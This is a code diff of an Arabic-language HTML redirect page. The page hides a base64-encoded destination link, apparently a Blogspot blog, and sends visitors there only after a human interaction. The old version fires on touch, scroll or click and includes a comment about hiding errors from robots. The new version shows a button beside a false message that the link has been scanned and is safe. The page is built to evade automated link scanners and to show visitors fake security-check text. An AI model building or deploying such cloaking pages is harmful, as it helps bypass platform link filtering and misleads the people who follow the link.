@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 المحتوى قيد التحميل...</title>
+    <title>🔒 جاري تجهيز المحتوى...</title>
     <style>
         body {
-            background: #0b0f19;
+            background-color: #0b0f19;
             color: #fff;
             font-family: sans-serif;
             display: flex;
@@ -14,56 +14,56 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            direction: rtl;
         }
-
-        .loader-text {
-            font-size: 19px;
-            letter-spacing: 1px;
-            animation: pulse 1.5s infinite;
+        .container {
             text-align: center;
-            line-height: 1.6;
+            padding: 20px;
         }
-
-        @keyframes pulse {
-            0% { opacity: 0.5; }
-            50% { opacity: 1; }
-            100% { opacity: 0.5; }
+        .loader-text {
+            font-size: 18px;
+            margin-bottom: 25px;
+            color: #cbd5e1;
+        }
+        /* زر صريح يضغط عليه الزائر لكي يسمح المتصفح بالتوجيه فوراً */
+        .action-btn {
+            display: inline-block;
+            padding: 12px 30px;
+            background-color: #ff0355;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(255, 3, 85, 0.4);
         }
     </style>
 </head>
 <body>
 
-    <div class="loader-text">
-        ...جاري فحص اتصالك الآمن<br>
-        <span style="font-size: 14px; color: #ff0355; font-weight: bold;">إلمس الشاشة أو مرر لأسفل للتحديث</span>
+    <div class="container">
+        <div class="loader-text">تم فحص الرابط بنجاح وأصبح جاهزاً للعرض.</div>
+        <a href="#" class="action-btn" id="redirectLink">إضغط هنا للمتابعة للمحتوى</a>
     </div>
 
     <script>
-        // الكود المشفر الخاص بمدونتك
+        // رابط مدونتك المشفر الثابت
         var encryptedDestination = "aHR0cHM6by91ZWF1dG1vbmx5ZmZucy5ibG9nc3BvdC5jb20=";
 
-        function decryptAndRedirect() {
+        document.getElementById('redirectLink').addEventListener('click', function(event) {
+            // منع السلوك الافتراضي للرابط الفارغ
+            event.preventDefault(); 
+            
             try {
-                // فك التشفير والتوجيه المباشر
                 var realUrl = atob(encryptedDestination);
-                window.location.replace(realUrl);
+                // التوجيه الفوري (المتصفح سيسمح به لأن الزائر ضغط بنفسه على الزر)
+                window.location.href = realUrl;
             } catch(e) {
-                // تجنب إظهار الأخطاء للروبوتات
+                // تجاوز الأخطاء
             }
-        }
-
-        // قفل الأمان السلوكي (يتفعل بمجرد لمس أو تحريك الشاشة)
-        window.addEventListener('touchmove', function() {
-            decryptAndRedirect();
-        }, { once: true });
-
-        window.addEventListener('scroll', function() {
-            decryptAndRedirect();
-        }, { once: true });
-
-        window.addEventListener('click', function() {
-            decryptAndRedirect();
-        }, { once: true });
+        });
     </script>
 
 </body>
